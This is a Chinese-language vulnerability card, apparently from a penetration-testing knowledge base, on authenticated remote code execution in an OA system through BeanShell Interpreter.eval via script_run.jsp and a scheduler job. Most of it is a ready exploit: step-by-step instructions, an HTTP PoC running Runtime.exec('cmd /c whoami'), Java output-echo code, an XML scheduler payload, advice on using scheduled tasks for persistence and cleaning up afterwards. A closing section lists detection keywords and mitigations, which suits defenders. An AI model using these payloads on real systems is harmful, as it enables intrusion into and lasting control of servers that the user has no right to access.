---
id: web-java-rce-oa-beanshell-interpreter-eval
title: OA BeanShell Interpreter.eval 代码执行（script_run.jsp / 调度任务 JobDataMap）
type: scenario
domain: web
path: web/java/rce
technique: oa-beanshell-interpreter-eval
aliases:
- OA BeanShell RCE
- script_run.jsp 代码执行
- BeanShellScriptJob
- Interpreter.eval
- scheduler_add_script.jsp
- BSH 代码执行
tags:
- java
- jsp
- beanshell
- bsh
- rce
- scheduler
- oa
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:02:34+08:00'
  notes: 已对照原文核对：script_run.jsp myscript传入Interpreter.eval；BeanShellScriptJob从JobDataMap取script执行，写入点SchedulerManager.init/JobUnitDb与scheduler_add_script.jsp；该节原文截图均为外链未在本地，按正文描述核对，卡片已标confidence=medium且注明需管理员权限；原文未给产品版本；PoC未复现
---

## 一句话结论

某 OA 直接使用 BeanShell（`bsh.Interpreter`）执行脚本：`admin/script_run.jsp` 把请求参数 `myscript` 传给 `Interpreter.eval()`，可直接执行 Java 代码；调度任务 `BeanShellScriptJob.execute()` 从 `JobExecutionContext` 的 `JobDataMap` 取 `script` 执行，而 `scheduler_add_script.jsp` 会把 `data_map`/`job_class` 写入调度任务表，管理员可在后台创建任务并等待自动触发。两处都可在服务端执行任意 Java。

## 原理

- **BeanShell 语义**：`bsh.Interpreter` 能解析并执行标准 Java 语法（对象创建、方法调用、控制流），`eval(String)` 在 JVM 内直接执行，等价于任意 Java 代码执行；不是沙箱。
- **第一处：`admin/script_run.jsp`**：第 57 行 `eval(myscript)`，`myscript` 通过 `request` 接收，完全可控。页面位于 `admin/`，可能需要管理员会话；原文未给出本地截图，但代码路径明确。
- **第二处：`BeanShellScriptJob.execute`**：从 `JobExecutionContext` 取 `JobDataMap`，再取 key=`script` 的字符串交给 `Interpreter.eval`。任务由 Quartz 调度，`BeanShellScriptJob` 在启动时自动执行。
- **写入点**：`SchedulerManager.init` 遍历调度任务；若 `className == com.redmoon.oa.job.BeanShellScriptJob`，从 `JobUnitDb` 取 `data_map` 放入 `getJobDataMap`。`scheduler_add_script.jsp` 通过 `qom.create` 把 XML 结构中的参数（`data_map`、`job_class`）写入数据库。该写入点要求管理员权限（原文明确“得登录”）。
- **利用形态**：直接访问 `script_run.jsp` 并传 `myscript` 是最短路径；若该页面不可达/被删，使用后台调度任务写入 `data_map`，等待调度器触发。
- **权限**：两处都需要一定的后台/管理员权限（`script_run.jsp` 在 `admin/` 下；调度写入需要管理员），属于“后台 RCE”而非未授权 RCE。

## 触发条件

- 目标为使用该 OA 代码库的应用，classpath 含 BeanShell（`bsh`），存在 `admin/script_run.jsp` 或 `BeanShellScriptJob`/调度功能。
- 攻击者能访问 `script_run.jsp` 并具备相应会话/权限，或能进入后台调度管理添加任务。
- 目标未移除/沙箱化 BeanShell，未禁用脚本执行功能。
- 调度任务场景需要调度器运行并加载 `JobUnitDb` 中的任务。

## 利用步骤

1. 访问 `admin/script_run.jsp`，确认可用；传 `myscript=...` 执行简单表达式（如 `System.out.println("test")`）验证。
2. 执行命令：`myscript=Runtime.getRuntime().exec("cmd /c whoami")`；如需回显，用 `Process` 读流并写入响应/文件。
3. 若 `script_run.jsp` 不可用：登录后台调度管理，打开 `scheduler_add_script.jsp`，构造任务：`job_class=com.redmoon.oa.job.BeanShellScriptJob`、`data_map` 含 `script=<恶意 BeanShell>`。
4. 保存任务，等待调度器自动触发（或手动触发）；脚本在服务端执行。
5. 验证命令输出/回连；清理任务与脚本。

## PoC

`script_run.jsp` 请求（结构示意）：

```http
POST /oa/admin/script_run.jsp HTTP/1.1
Host: target:8088
Content-Type: application/x-www-form-urlencoded
Cookie: <admin session>

myscript=Runtime.getRuntime().exec("cmd /c whoami");
```

BeanShell 回显片段（示例）：

```java
import java.io.*;
Process p = Runtime.getRuntime().exec("cmd /c whoami");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; StringBuilder sb = new StringBuilder();
while ((line = br.readLine()) != null) sb.append(line).append("\n");
return sb.toString();
```

调度任务 `data_map` 结构（示意，字段名按目标 XML 调整）：

```xml
<data_map>
  <entry>
    <key>script</key>
    <value>Runtime.getRuntime().exec("cmd /c whoami");</value>
  </entry>
</data_map>
```

## 变体与关联

- **BeanShell 其他入口**：搜索 `new Interpreter()`/`Interpreter.eval` 可发现更多 JSP/Job；任何把请求参数/数据库字段传给 `eval` 的点都等价。
- **调度任务持久化**：任务写入数据库后可长期存在，重启后仍可能恢复；属于权限维持面。
- **权限差异**：`script_run.jsp` 可能只需后台会话；调度写入需要管理员；若结合越权/弱口令可降低门槛。
- 关联卡片：[[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]（访问 admin JSP 的过滤器绕过）、[[web-java-rce-jsp-scriptlet-runtime-exec]]（如已存在）。

## 检测与防御

- **移除/隔离**：删除 `script_run.jsp` 与不必要的调度脚本功能；如必须保留，使用受限脚本引擎/沙箱（无 `Runtime`/`ProcessBuilder`/文件/网络权限）并严格白名单。
- **权限**：限制 `admin/` 与调度管理权限，强制强口令/MFA；审计后台任务创建。
- **检测**：请求参数 `myscript`/`script` 含 `Runtime`、`ProcessBuilder`、`exec`、`java.io`、`new Interpreter`；`script_run.jsp` 访问日志；`JobUnitDb`/调度表新增 `BeanShellScriptJob` 任务；Web 进程异常子进程。
- **应急**：删除恶意任务/脚本，排查子进程与临时文件；升级/移除 BeanShell；审计管理员账号与后台操作日志。
